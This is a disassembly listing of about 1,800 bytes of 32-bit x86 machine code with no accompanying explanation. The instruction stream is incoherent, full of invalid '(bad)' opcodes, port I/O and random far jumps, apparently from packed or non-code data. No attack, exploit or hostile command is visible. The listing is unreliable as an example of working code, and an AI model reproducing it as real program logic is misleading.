  40f0df:	adc    esi,DWORD PTR [edx]
  40f0e1:	pop    ss
  40f0e2:	cmp    DWORD PTR [edi],eax
  40f0e4:	es popf 
  40f0e6:	mov    eax,0xdea5fbd2
  40f0eb:	pop    ebx
  40f0ec:	add    al,0x54
  40f0ee:	jmp    DWORD PTR cs:0x36083ade
  40f0f5:	xchg   edx,eax
  40f0f6:	shl    BYTE PTR ds:0x4052f501,1
  40f0fc:	push   esi
  40f0fd:	pop    es
  40f0fe:	mov    ebx,0x741ca260
  40f103:	in     eax,dx
  40f104:	push   ss
  40f105:	icebp  
  40f106:	sbb    edi,DWORD PTR [ebp-0x45e29cf5]
  40f10c:	div    ecx
  40f10e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f10f:	jno    0x40f107
  40f111:	push   eax
  40f112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f113:	retf   0x92ed
  40f116:	repz lds cx,DWORD PTR [eax-0x52079db7]
  40f11e:	xor    al,0x49
  40f120:	mov    ebx,ebx
  40f122:	mov    edi,0x789e503f
  40f127:	clc    
  40f128:	loop   0x40f0b9
  40f12a:	mov    cs,WORD PTR [esi]
  40f12c:	pop    ecx
  40f12d:	jp     0x40f0f3
  40f12f:	inc    edx
  40f130:	sti    
  40f131:	stos   DWORD PTR es:[edi],eax
  40f132:	jl     0x40f119
  40f134:	add    al,0x3c
  40f136:	in     al,dx
  40f137:	mul    cl
  40f139:	and    ebp,DWORD PTR [ebx]
  40f13b:	out    0x13,eax
  40f13d:	loop   0x40f0f1
  40f13f:	or     al,0x68
  40f141:	js     0x40f0d9
  40f143:	ret    
  40f144:	push   edi
  40f145:	sbb    eax,0xfa6966e7
  40f14a:	pop    ds
  40f14b:	and    BYTE PTR [edx+0x75],ch
  40f14e:	call   0x1579bae0
  40f153:	lods   eax,DWORD PTR ds:[esi]
  40f154:	(bad)  
  40f155:	aas    
  40f156:	inc    ebp
  40f157:	fisubr DWORD PTR [esi+esi*4-0x4f]
  40f15b:	test   eax,0x56ca282
  40f160:	lods   eax,DWORD PTR ds:[esi]
  40f161:	call   0x82ccd0bd
  40f166:	leave  
  40f167:	sahf   
  40f168:	fmul   QWORD PTR [eax-0x77]
  40f16b:	stos   DWORD PTR es:[edi],eax
  40f16c:	shl    edx,cl
  40f16e:	sub    cl,BYTE PTR [edi]
  40f170:	dec    ebx
  40f171:	or     eax,0xe289be22
  40f176:	test   al,0x4
  40f178:	inc    ebp
  40f179:	sbb    al,0x2e
  40f17b:	sub    al,0x83
  40f17d:	xacquire xchg DWORD PTR [esi],ecx
  40f180:	scas   eax,DWORD PTR es:[edi]
  40f181:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40f183:	add    ebp,DWORD PTR [ebx-0x5704d685]
  40f189:	js     0x40f1fd
  40f18b:	lods   eax,DWORD PTR ds:[esi]
  40f18c:	xor    ebp,eax
  40f18e:	stc    
  40f18f:	stos   BYTE PTR es:[edi],al
  40f190:	lock cwde 
  40f192:	mov    ebx,0x7872786
  40f197:	mov    bh,0xe
  40f199:	out    0x44,al
  40f19b:	nop
  40f19c:	add    dl,BYTE PTR [ebp+edi*2+0x4a]
  40f1a0:	dec    DWORD PTR [ebx]
  40f1a2:	sar    edx,0x77
  40f1a5:	inc    edi
  40f1a6:	mov    ebx,0xe8a2710a
  40f1ab:	mov    WORD PTR [eax],gs
  40f1ad:	jecxz  0x40f1dc
  40f1af:	inc    eax
  40f1b0:	dec    esi
  40f1b1:	cwde   
  40f1b2:	adc    DWORD PTR [ecx],ebx
  40f1b4:	es loope 0x40f15b
  40f1b7:	push   ebx
  40f1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b9:	aaa    
  40f1ba:	and    DWORD PTR [ebp-0x1d],edi
  40f1bd:	popa   
  40f1be:	cld    
  40f1bf:	sub    eax,0x3790f403
  40f1c4:	retf   
  40f1c5:	shl    ebx,cl
  40f1c7:	repnz data16 clc 
  40f1ca:	in     eax,0xdd
  40f1cc:	(bad)  
  40f1cd:	or     sp,WORD PTR [ebx-0x79]
  40f1d1:	jl     0x40f1e6
  40f1d3:	test   al,0x93
  40f1d5:	in     al,0xed
  40f1d7:	push   0xd693d215
  40f1dc:	(bad)  
  40f1dd:	jle    0x40f220
  40f1df:	mov    WORD PTR [ebp+0x3e57de5d],ds
  40f1e5:	enter  0x2441,0xb2
  40f1e9:	cwde   
  40f1ea:	repz cmp al,0x4c
  40f1ed:	jne    0x40f197
  40f1ef:	std    
  40f1f0:	push   es
  40f1f1:	scas   eax,DWORD PTR es:[edi]
  40f1f2:	jbe    0x40f1a4
  40f1f4:	mov    ch,BYTE PTR [esi+0x74bd5ea8]
  40f1fa:	mov    edx,0x27aae0b
  40f1ff:	or     al,BYTE PTR [edi]
  40f201:	arpl   WORD PTR [esi],cx
  40f203:	das    
  40f204:	(bad)  [eax-0x540d649]
  40f20a:	or     edx,DWORD PTR [ebx-0x6e]
  40f20d:	daa    
  40f20e:	lods   eax,DWORD PTR ds:[esi]
  40f20f:	repz jne 0x40f289
  40f212:	(bad)  
  40f213:	pop    esp
  40f214:	es test al,0x29
  40f217:	(bad)  
  40f219:	jbe    0x40f1a6
  40f21b:	sub    al,0x51
  40f21d:	sbb    al,0x26
  40f21f:	xchg   edi,eax
  40f220:	xchg   DWORD PTR [eax+0x15ecf66c],ebx
  40f226:	xor    ecx,DWORD PTR [edx+0x35301339]
  40f22c:	jne    0x40f249
  40f22e:	das    
  40f22f:	or     esp,DWORD PTR [edx]
  40f231:	mov    dh,0x63
  40f233:	adc    DWORD PTR [edx-0x26],ebp
  40f236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f237:	lods   al,BYTE PTR ds:[esi]
  40f238:	mov    bl,0x7e
  40f23a:	jmp    0xd128:0xc946c9c8
  40f241:	mov    ds:0x83061337,eax
  40f246:	cwde   
  40f247:	xchg   ecx,eax
  40f248:	xchg   ebp,eax
  40f249:	scas   al,BYTE PTR es:[edi]
  40f24a:	mov    edx,0x6a4debb1
  40f24f:	cmc    
  40f250:	jo     0x40f26c
  40f252:	xor    ah,BYTE PTR [eax]
  40f254:	jae    0x40f2cf
  40f256:	add    eax,0x14a3de59
  40f25b:	dec    esi
  40f25c:	outs   dx,DWORD PTR ds:[esi]
  40f25d:	dec    edi
  40f25e:	xchg   esi,eax
  40f25f:	push   0xffffff8e
  40f261:	add    ecx,edx
  40f263:	sbb    al,0x8f
  40f265:	in     eax,dx
  40f266:	push   ecx
  40f267:	push   edx
  40f268:	xchg   edx,eax
  40f269:	enter  0x4fe0,0xe0
  40f26d:	xchg   ebp,eax
  40f26e:	cli    
  40f26f:	and    eax,0x1cb17835
  40f274:	(bad)  
  40f275:	loope  0x40f1f9
  40f277:	in     al,0x8e
  40f279:	cmp    ch,dl
  40f27b:	sbb    ecx,edi
  40f27d:	int3   
  40f27e:	jge    0x40f2fd
  40f280:	inc    edx
  40f281:	fsubrp st(6),st
  40f283:	in     al,0x81
  40f285:	cmp    ebp,DWORD PTR [ecx]
  40f287:	cmp    esi,DWORD PTR [edi]
  40f289:	xor    DWORD PTR [ecx],0x2f
  40f28c:	call   0xeac2c8d1
  40f291:	and    ebp,ebp
  40f293:	les    edi,FWORD PTR [edi+ecx*4-0x17]
  40f297:	sbb    al,0xd6
  40f299:	repnz ins BYTE PTR es:[edi],dx
  40f29b:	jmp    0xe255:0xdc23063f
  40f2a2:	aad    0xe7
  40f2a4:	aas    
  40f2a5:	dec    esp
  40f2a6:	in     al,0x85
  40f2a8:	add    DWORD PTR [ebp+0x2ed70ae7],esi
  40f2ae:	xor    DWORD PTR [edx-0x46],ebp
  40f2b1:	add    bl,BYTE PTR [edi+0x7f6eb305]
  40f2b7:	pop    eax
  40f2b8:	call   0x27e85a90
  40f2bd:	and    BYTE PTR [esp-0x6b],ch
  40f2c1:	leave  
  40f2c2:	cwde   
  40f2c3:	stos   BYTE PTR es:[edi],al
  40f2c4:	sar    dl,cl
  40f2c6:	add    eax,DWORD PTR [ebx]
  40f2c8:	ins    DWORD PTR es:[edi],dx
  40f2c9:	cmp    BYTE PTR [ecx+eax*4+0x42],ah
  40f2cd:	loop   0x40f33d
  40f2cf:	fidivr WORD PTR [esi+edi*1]
  40f2d2:	idiv   DWORD PTR [edx+0x14]
  40f2d5:	xlat   BYTE PTR ds:[ebx]
  40f2d6:	mov    esi,0x83e96a68
  40f2db:	cmp    al,0x94
  40f2dd:	cwde   
  40f2de:	sub    al,0x9b
  40f2e0:	or     ah,BYTE PTR [ecx+ebx*1-0x6a8d57c]
  40f2e7:	push   edi
  40f2e8:	std    
  40f2e9:	lods   eax,DWORD PTR ds:[esi]
  40f2ea:	or     cl,BYTE PTR [eax+0x44]
  40f2ed:	lods   al,BYTE PTR ds:[esi]
  40f2ee:	fdivr  st(1),st
  40f2f0:	jo     0x40f328
  40f2f2:	push   ebp
  40f2f3:	sbb    BYTE PTR [esi-0x41],0x63
  40f2f7:	in     eax,0x42
  40f2f9:	xchg   ebx,eax
  40f2fa:	pop    edi
  40f2fb:	sbb    eax,0x66146adb
  40f300:	call   0x4a0b:0x2d43cfd4
  40f307:	out    0x5b,eax
  40f309:	in     eax,dx
  40f30a:	(bad)  
  40f30b:	clc    
  40f30c:	out    0xf5,eax
  40f30e:	arpl   WORD PTR [ebx+0x11855a39],di
  40f314:	dec    esp
  40f315:	repz adc al,0x1a
  40f318:	xor    DWORD PTR [esi+0x37],ebp
  40f31b:	clc    
  40f31c:	mov    ch,0xee
  40f31e:	mov    ch,0x37
  40f320:	jae    0x40f38e
  40f322:	mov    WORD PTR [eax],gs
  40f324:	jecxz  0x40f2e7
  40f326:	and    al,0xa9
  40f328:	pop    eax
  40f329:	idiv   ebx
  40f32b:	mov    esi,0x473f919d
  40f330:	mov    ch,bh
  40f332:	ss push esp
  40f334:	ror    BYTE PTR [eax+0x5de2d9bb],1
  40f33a:	mov    WORD PTR [ecx+0x50a2d04c],ds
  40f340:	jnp    0x40f36c
  40f342:	mov    al,BYTE PTR [edx-0x20]
  40f345:	sub    DWORD PTR [edi+edx*1+0x46],esp
  40f349:	idiv   DWORD PTR [edi+0x30788887]
  40f34f:	leave  
  40f350:	or     eax,0x52c28e99
  40f355:	xchg   esi,eax
  40f356:	sbb    al,0xf2
  40f358:	iret   
  40f359:	ss je  0x40f3c4
  40f35c:	sub    al,cl
  40f35e:	adc    BYTE PTR [eax+0x5e],ah
  40f361:	fcom   DWORD PTR [ecx+0x4b3b9d48]
  40f367:	and    eax,DWORD PTR [ecx-0x1f]
  40f36a:	int3   
  40f36b:	ror    ecx,0xee
  40f36e:	es out 0xe4,al
  40f371:	inc    edx
  40f372:	jl     0x40f33a
  40f374:	(bad)  
  40f375:	mov    bh,0x98
  40f377:	sub    edx,DWORD PTR [edi+0x3f]
  40f37a:	bound  esp,QWORD PTR [esi+0x24]
  40f37d:	mov    eax,ds:0x38c7951c
  40f382:	dec    edi
  40f383:	fcmovb st,st(4)
  40f385:	mov    cl,bl
  40f387:	test   ebx,esp
  40f389:	or     eax,0x4504eba0
  40f38e:	adc    DWORD PTR [edx-0x3086852b],ebp
  40f394:	inc    ebx
  40f395:	jnp    0x40f3e1
  40f397:	outs   dx,DWORD PTR ds:[esi]
  40f398:	sub    ebp,eax
  40f39a:	sub    BYTE PTR [ecx+0x45],ah
  40f39d:	push   cs
  40f39e:	mov    al,ds:0x3f6d59bd
  40f3a3:	call   0x2a27:0xdf0d2278
  40f3aa:	mov    ch,ch
  40f3ac:	jp     0x40f3d2
  40f3ae:	mov    dh,0xab
  40f3b0:	dec    edx
  40f3b1:	push   esp
  40f3b2:	fwait
  40f3b3:	in     eax,0xa7
  40f3b5:	xchg   esp,eax
  40f3b6:	lock xchg ecx,eax
  40f3b8:	pop    ss
  40f3b9:	lea    esp,[esi-0xe]
  40f3bc:	add    BYTE PTR [eax],bl
  40f3be:	repnz (bad)
  40f3c1:	adc    al,0xc4
  40f3c3:	ds ins DWORD PTR es:[di],dx
  40f3c6:	les    eax,FWORD PTR [ebp-0x4]
  40f3c9:	mov    BYTE PTR [edx+0x26a4a1d6],al
  40f3cf:	fisub  DWORD PTR [esi]
  40f3d1:	aaa    
  40f3d2:	and    DWORD PTR [esi-0x25],ebx
  40f3d5:	xchg   edx,eax
  40f3d6:	clc    
  40f3d7:	sub    eax,0xe081f9e7
  40f3dc:	jp     0x40f44d
  40f3de:	push   0xe408cabc
  40f3e3:	call   0x82ad:0x284a56ef
  40f3ea:	fmul   DWORD PTR [eax]
  40f3ec:	out    dx,eax
  40f3ed:	aad    0xcd
  40f3ef:	xchg   ecx,eax
  40f3f0:	xchg   ebp,eax
  40f3f1:	out    dx,eax
  40f3f2:	in     eax,0x72
  40f3f4:	pop    es
  40f3f5:	daa    
  40f3f6:	(bad)  
  40f3f7:	mov    dl,0x2f
  40f3f9:	inc    ebp
  40f3fa:	xor    al,0x2e
  40f3fc:	xor    al,0x96
  40f3fe:	pop    edi
  40f3ff:	(bad)  
  40f400:	jecxz  0x40f3f6
  40f402:	or     BYTE PTR [ecx],al
  40f404:	mov    bh,0x93
  40f406:	lds    edx,FWORD PTR [ebp+0x6]
  40f409:	sbb    edx,DWORD PTR [edx-0x443f25e5]
  40f40f:	lea    ebx,[ebp-0x4]
  40f412:	gs dec edi
  40f414:	nop
  40f415:	bound  eax,QWORD PTR [ecx+0x3baf2460]
  40f41b:	inc    esi
  40f41c:	push   ds
  40f41d:	lds    ebp,FWORD PTR [edx-0x68]
  40f420:	mov    ebp,0x2760b983
  40f425:	sub    DWORD PTR [edi+0x2f],esp
  40f428:	shr    DWORD PTR [ebp-0x5b],cl
  40f42b:	mov    dh,0x5f
  40f42d:	sub    DWORD PTR [ebx],0x5a474c8c
  40f433:	lods   al,BYTE PTR ds:[esi]
  40f434:	mov    bl,0xa3
  40f436:	add    eax,0x30925aee
  40f43b:	sbb    DWORD PTR [eax+ebp*4-0x574c6e36],esp
  40f442:	push   ss
  40f443:	test   DWORD PTR [edx],0x991f78ab
  40f449:	inc    ecx
  40f44a:	add    DWORD PTR [ebx],esi
  40f44c:	sub    ecx,0x4d037b71
  40f452:	int3   
  40f453:	aaa    
  40f454:	jecxz  0x40f3d9
  40f456:	clc    
  40f457:	jl     0x40f4cf
  40f459:	rcr    DWORD PTR [ebx],cl
  40f45b:	sbb    dl,al
  40f45d:	inc    esp
  40f45e:	mov    esp,0xc9bc785c
  40f463:	pop    ebx
  40f464:	imul   ebx,DWORD PTR [edi-0x2432d7d3],0x56c94e21
  40f46e:	sub    BYTE PTR [ecx],bh
  40f470:	fidivr WORD PTR [eax+0x72]
  40f473:	add    eax,0xe60b4a99
  40f478:	xchg   esi,eax
  40f479:	aad    0xd6
  40f47b:	nop
  40f47c:	das    
  40f47d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f47e:	into   
  40f47f:	scas   al,BYTE PTR es:[edi]
  40f480:	fcmovu st,st(5)
  40f482:	and    cl,dh
  40f484:	push   esp
  40f485:	fidiv  WORD PTR [edx]
  40f487:	and    BYTE PTR [ebx],dh
  40f489:	or     DWORD PTR [ecx-0x66],eax
  40f48c:	pop    edx
  40f48d:	daa    
  40f48e:	sbb    al,0x3d
  40f490:	test   DWORD PTR [esi+0x7f],ebp
  40f493:	push   ebp
  40f494:	adc    al,BYTE PTR [ebx]
  40f496:	mov    esp,0x4f708b86
  40f49b:	imul   ecx,DWORD PTR [ebp+edx*4+0x7b],0xffffff8e
  40f4a0:	cdq    
  40f4a1:	add    eax,edi
  40f4a3:	xor    ebp,DWORD PTR [esi-0x6b9774e6]
  40f4a9:	aas    
  40f4aa:	mov    ebp,0xaea15048
  40f4af:	pop    eax
  40f4b0:	(bad)  
  40f4b3:	dec    esi
  40f4b4:	scas   eax,DWORD PTR es:[edi]
  40f4b5:	xchg   ecx,eax
  40f4b6:	mov    ds:0x57840730,al
  40f4bb:	jne    0x40f4fe
  40f4bd:	aas    
  40f4be:	jno    0x40f467
  40f4c0:	xchg   DWORD PTR [ebx+0x163ab821],eax
  40f4c6:	push   esi
  40f4c7:	jns    0x40f48e
  40f4c9:	out    dx,al
  40f4ca:	cmp    ecx,edx
  40f4cc:	sahf   
  40f4cd:	jo     0x40f49a
  40f4cf:	(bad)  
  40f4d0:	lods   eax,DWORD PTR ds:[esi]
  40f4d1:	adc    BYTE PTR [ebp+0x47b27112],al
  40f4d7:	inc    edi
  40f4d8:	xchg   ecx,eax
  40f4d9:	cmp    eax,0x5ea9f0bf
  40f4de:	xchg   esi,eax
  40f4df:	es xchg edx,eax
  40f4e1:	ret    0x369f
  40f4e4:	mov    ch,0x25
  40f4e6:	hlt    
  40f4e7:	pop    ebx
  40f4e8:	dec    esp
  40f4e9:	xchg   BYTE PTR [ebx+0x2458b57f],ch
  40f4ef:	sbb    al,0xb
  40f4f1:	in     eax,dx
  40f4f2:	dec    ecx
  40f4f3:	jp     0x40f501
  40f4f5:	lea    ebx,[ebp*4-0x487abc7b]
  40f4fc:	push   ss
  40f4fd:	enter  0x9db7,0xe8
  40f501:	push   ebp
  40f502:	xchg   edi,eax
  40f503:	int3   
  40f504:	out    0x3b,al
  40f506:	lahf   
  40f507:	cmp    dl,cl
  40f509:	and    al,0x10
  40f50b:	add    bl,BYTE PTR [ecx+0x3ed129b]
  40f511:	pop    ebp
  40f512:	ja     0x40f54c
  40f514:	icebp  
  40f515:	mov    dh,0xb7
  40f517:	cmp    ah,bl
  40f519:	push   ss
  40f51a:	lods   eax,DWORD PTR ds:[esi]
  40f51b:	test   al,0xa8
  40f51d:	push   esp
  40f51e:	pop    ebx
  40f51f:	sbb    BYTE PTR [ebx+0x61],cl
  40f522:	sub    bl,dh
  40f524:	sar    bl,cl
  40f526:	sahf   
  40f527:	stc    
  40f528:	fldcw  WORD PTR [ebx-0x25]
  40f52b:	ja     0x40f531
  40f52d:	aam    0x7d
  40f52f:	jb     0x40f500
  40f531:	sahf   
  40f532:	js     0x40f583
  40f534:	xor    bl,bh
  40f536:	xchg   ecx,eax
  40f537:	xchg   edi,eax
  40f538:	ins    BYTE PTR es:[edi],dx
  40f539:	aad    0xdc
  40f53b:	cmp    esp,edi
  40f53d:	jb     0x40f528
  40f53f:	or     esp,eax
  40f541:	and    BYTE PTR [ebx],al
  40f543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f544:	loopne 0x40f5ad
  40f546:	clc    
  40f547:	mov    ebp,ecx
  40f549:	sbb    cl,BYTE PTR [ebp-0x56dabb80]
  40f54f:	call   0xe88a:0xcdfe56ac
  40f556:	add    esi,ebx
  40f558:	out    0xf1,eax
  40f55a:	add    cl,dh
  40f55c:	arpl   WORD PTR ds:0xad33b993,sp
  40f562:	mov    ds,WORD PTR [esi]
  40f564:	ret    0xe046
  40f567:	js     0x40f578
  40f569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f56a:	or     BYTE PTR [edx],cl
  40f56c:	lds    edx,FWORD PTR [edi+ebx*8+0x2b]
  40f570:	aam    0x9f
  40f572:	sub    eax,0x2aa68f53
  40f577:	mov    al,ds:0xad3e00b4
  40f57c:	mov    ds:0x40286b3d,al
  40f581:	adc    eax,0xd8672541
  40f586:	cmp    DWORD PTR [esi+0x69],ecx
  40f589:	push   ds
  40f58a:	shl    DWORD PTR [esi+0x607173d7],0x4
  40f591:	dec    edx
  40f592:	js     0x40f554
  40f594:	std    
  40f595:	shl    DWORD PTR [edx],0xac
  40f598:	add    BYTE PTR [esi-0x4f69e638],ch
  40f59e:	sar    esp,1
  40f5a0:	mov    ah,0xf5
  40f5a2:	or     eax,0xce835745
  40f5a7:	cli    
  40f5a8:	mov    dl,0x73
  40f5aa:	pop    ebx
  40f5ab:	les    ecx,FWORD PTR ds:0xa3bdfd9c
  40f5b1:	pop    esi
  40f5b2:	or     DWORD PTR [esi],esi
  40f5b4:	cs jecxz 0x40f5cb
  40f5b7:	cmp    ecx,esi
  40f5b9:	cmp    BYTE PTR [eax],al
  40f5bb:	lea    esp,[ecx+esi*4+0x1e]
  40f5bf:	pop    eax
  40f5c0:	sub    BYTE PTR ds:[eax+0x48],bh
  40f5c4:	mov    edi,0xfe117b80
  40f5c9:	fidivr WORD PTR es:[ebx]
  40f5cc:	rol    esp,cl
  40f5ce:	(bad)  
  40f5cf:	imul   ebp,DWORD PTR ds:0xcede947,0xb0dbc724
  40f5d9:	xchg   edi,eax
  40f5da:	js     0x40f5b9
  40f5dc:	and    DWORD PTR ds:0xd9c7d65,eax
  40f5e2:	js     0x40f60f
  40f5e4:	xlat   BYTE PTR ds:[ebx]
  40f5e5:	pusha  
  40f5e6:	push   0x31d0457b
  40f5eb:	gs sahf 
  40f5ed:	out    0x53,eax
  40f5ef:	or     DWORD PTR [eax+0x17de8e12],ebp
  40f5f5:	imul   ebp,DWORD PTR [esi+0x2e5ba2ab],0x5b
  40f5fc:	inc    ebx
  40f5fd:	cli    
  40f5fe:	bound  ebp,QWORD PTR [esi+0x65]
  40f601:	or     bh,dl
  40f603:	arpl   WORD PTR [ecx],bp
  40f605:	mov    ah,bh
  40f607:	mov    edi,0x184dfe48
  40f60c:	sub    edi,edi
  40f60e:	ror    DWORD PTR [edx+0x11],1
  40f611:	ja     0x40f670
  40f613:	mov    cl,0x65
  40f615:	cmp    eax,0x9a65b159
  40f61a:	mov    ah,0xf
  40f61c:	test   edx,esp
  40f61e:	push   0xfffffff2
  40f620:	inc    ecx
  40f621:	(bad)  
  40f622:	jmp    0x40f5dc
  40f624:	and    DWORD PTR [eax],eax
  40f626:	fadd   QWORD PTR [edx-0x5f]
  40f629:	test   eax,0xf578a4d0
  40f62e:	adc    bl,cl
  40f630:	sbb    DWORD PTR [edx-0x5bce008e],esi
  40f636:	adc    DWORD PTR [eax+0x79],esp
  40f639:	das    
  40f63a:	mov    dl,0x7f
  40f63c:	pushf  
  40f63d:	xor    bh,dl
  40f63f:	fs clc 
  40f641:	adc    ch,BYTE PTR [eax]
  40f643:	call   0x75e1:0x620d7a31
  40f64a:	jbe    0x40f5f6
  40f64c:	xchg   ebx,eax
  40f64d:	jg     0x40f5f1
  40f64f:	pop    ds
  40f650:	sti    
  40f651:	sbb    BYTE PTR [eax],cl
  40f653:	xor    esp,eax
  40f655:	in     eax,dx
  40f656:	imul   ebx,eax,0x52
  40f659:	pop    ds
  40f65a:	js     0x40f618
  40f65c:	in     eax,0xdc
  40f65e:	lahf   
  40f65f:	fnstenv [esp+esi*1+0x565d5832]
  40f666:	pop    edx
  40f667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f668:	imul   eax,DWORD PTR [eax+0x77],0x45
  40f66c:	mov    dh,0x58
  40f66e:	pusha  
  40f66f:	xchg   edi,eax
  40f670:	retf   0x9bc9
  40f673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f674:	xchg   ecx,eax
  40f675:	stos   DWORD PTR es:[edi],eax
  40f676:	out    dx,al
  40f677:	mov    ebp,0x6b536bed
  40f67c:	and    eax,0xe784f36e
  40f681:	lods   eax,DWORD PTR ds:[esi]
  40f682:	scas   eax,DWORD PTR es:[edi]
  40f683:	nop
  40f684:	xor    dl,dl
  40f686:	push   ebx
  40f687:	xchg   esp,eax
  40f688:	test   DWORD PTR [ebx],ebx
  40f68a:	cli    
  40f68b:	imul   BYTE PTR [edx]
  40f68d:	ss mov edx,0xbb29f1d1
  40f693:	pop    ecx
  40f694:	dec    ecx
  40f695:	mov    edx,0x75fa3988
  40f69a:	fmul   QWORD PTR [edx+0x28]
  40f69d:	mov    BYTE PTR [esi+0x5],dh
  40f6a0:	push   0x22
  40f6a2:	bound  ebx,QWORD PTR [ebp+0x1cff08e9]
  40f6a8:	pusha  
  40f6a9:	jp     0x40f6ae
  40f6ab:	mov    DWORD PTR [ebx+0x42],edx
  40f6ae:	xchg   bh,ch
  40f6b0:	push   es
  40f6b1:	pop    edi
  40f6b2:	or     esi,esp
  40f6b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6b5:	sbb    BYTE PTR [ebx-0x6c],bh
  40f6b8:	mov    edi,0x4686340a
  40f6bd:	or     DWORD PTR [edi-0x58a9a7b9],esp
  40f6c3:	xor    ebx,DWORD PTR fs:[edx+0x38]
  40f6c7:	mov    ah,0x3a
  40f6c9:	les    eax,FWORD PTR [eax-0x6c]
  40f6cc:	xchg   BYTE PTR [esi+0x48471d5],dl
  40f6d2:	xor    al,0x98
  40f6d4:	retf   
  40f6d5:	scas   eax,DWORD PTR es:[edi]
  40f6d6:	cmp    BYTE PTR [eax+0x6e],dl
  40f6d9:	sti    
  40f6da:	dec    eax
  40f6db:	out    0x57,eax
  40f6dd:	call   0x6922:0x930533c2
  40f6e4:	push   ds
  40f6e5:	inc    eax
  40f6e6:	pop    edi
  40f6e7:	std    
  40f6e8:	mov    ?,WORD PTR [ebx]
  40f6ea:	add    eax,0xcfa40a77
  40f6ef:	add    BYTE PTR [ecx+edi*8+0x7e],0x50
  40f6f4:	cs xchg ecx,eax
  40f6f6:	xchg   esi,eax
  40f6f7:	mov    edi,DWORD PTR [ebp-0x579a415b]
  40f6fd:	jmp    0x40f6fe
  40f6ff:	inc    cl
  40f701:	ins    BYTE PTR es:[edi],dx
  40f702:	dec    ebp
  40f703:	xchg   ebx,eax
  40f704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f705:	or     ah,BYTE PTR [esi+0x35]
  40f708:	mov    es,WORD PTR [ecx-0x520350d3]
  40f70e:	cmp    edx,DWORD PTR [ebx-0x49]
  40f711:	sti    
  40f712:	in     al,dx
  40f713:	cli    
  40f714:	sbb    ebp,DWORD PTR [eax+0x1c688edd]
  40f71a:	fwait
  40f71b:	call   0x764f:0xff61ec24
  40f722:	or     ch,BYTE PTR [edi+0x3a]
  40f725:	mov    dh,0x1f
  40f727:	push   esi
  40f728:	xor    cl,BYTE PTR [edi+0x7c54ee8]
  40f72e:	xchg   esi,eax
  40f72f:	mov    ebp,0x721de149
  40f734:	sbb    DWORD PTR [ebx+esi*2-0x592f9d7c],0x5d
  40f73c:	and    eax,0x72722210
  40f741:	add    edi,eax
  40f743:	adc    eax,0x2de50b8c
  40f748:	inc    ebp
  40f749:	dec    edx
  40f74a:	xchg   edi,eax
  40f74b:	adc    al,0x2c
  40f74d:	xor    eax,0x9c2e5ab7
  40f752:	fs in  al,dx
  40f754:	jp     0x40f769
  40f756:	fs mov cl,0x7d
  40f759:	adc    bh,ch
  40f75b:	sti    
  40f75c:	pop    ecx
  40f75d:	xor    DWORD PTR [ebp-0x2c0d8b1],esp
  40f763:	xor    al,0xd
  40f765:	loop   0x40f7c5
  40f767:	lahf   
  40f768:	adc    eax,0x67729889
  40f76d:	fild   DWORD PTR [edi]
  40f76f:	mov    ah,BYTE PTR [esi+0x4d86c13e]
  40f775:	or     cl,BYTE PTR [ebx]
  40f777:	sbb    bl,ah
  40f779:	retf   
  40f77a:	xor    al,0xd8
  40f77c:	adc    al,bh
  40f77e:	(bad)  
  40f77f:	repnz dec esp
  40f781:	push   eax
  40f782:	sub    bl,BYTE PTR [edi+0x0]
  40f785:	dec    esi
  40f786:	sbb    ebp,ebp
  40f788:	xor    eax,0x9e2cf2a8
  40f78d:	xor    esp,ecx
  40f78f:	mov    bh,0x55
  40f791:	inc    ebp
  40f792:	imul   ebx,DWORD PTR [ebx-0x3a],0x74d93fe7
  40f799:	ja     0x40f78d
  40f79b:	int    0xfb
  40f79d:	and    DWORD PTR [edi-0x17ddb1ed],esi
  40f7a3:	ret    
  40f7a4:	inc    edx
  40f7a5:	ret    0x81e
  40f7a8:	dec    edi
  40f7a9:	lea    edi,[ebx]
  40f7ab:	or     eax,0x913ff81
  40f7b0:	(bad)  
  40f7b1:	out    dx,al
  40f7b2:	jecxz  0x40f78f
  40f7b4:	pushf  
  40f7b5:	pop    eax
  40f7b6:	(bad)  
  40f7b7:	mov    edi,0xc9d4da1d
  40f7bc:	dec    esi
  40f7bd:	inc    eax
  40f7be:	nop
  40f7bf:	pop    ss
  40f7c0:	out    0xf8,eax
  40f7c2:	clc    
  40f7c3:	das    
  40f7c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7c5:	or     edi,esp
  40f7c7:	in     al,dx
  40f7c8:	xchg   BYTE PTR [edi],bh
  40f7ca:	xchg   esi,eax
  40f7cb:	pop    esp
  40f7cc:	in     al,0xfc
  40f7ce:	xor    al,0xaf
  40f7d0:	jle    0x40f7ef
  40f7d2:	sub    eax,0x61000ee7
  40f7d7:	jno    0x40f7e1
  40f7d9:	xor    BYTE PTR [ebp+0x54],dh
  40f7dc:	pop    eax
  40f7dd:	jg     0x40f800
  40f7df:	mov    ch,BYTE PTR [esi]
  40f7e1:	sahf   
  40f7e2:	add    ebx,edx
  40f7e4:	addr16 inc ebp
  40f7e6:	out    dx,eax
  40f7e7:	push   edx
  40f7e8:	lds    esp,FWORD PTR [edi+eax*8+0x68]
  40f7ec:	add    DWORD PTR [esi],esp
  40f7ee:	call   0x9665:0x71f09ae7
  40f7f5:	loop   0x40f842
  40f7f7:	out    0xc9,al
  40f7f9:	js     0x40f856
  40f7fb:	mov    ebp,0x4a67f1f0
  40f800:	in     al,dx
  40f801:	mov    ch,0x7c
  40f803:	sub    ah,ch
  40f805:	pop    eax
  40f806:	push   0xb388cada
  40f80b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f80c:	jp     0x40f795
  40f80e:	pushf  
  40f80f:	push   eax
  40f810:	sub    DWORD PTR [ecx-0x33864602],ecx
  40f816:	xchg   esp,eax
  40f817:	mov    edx,DWORD PTR [ebp-0x1311b21b]
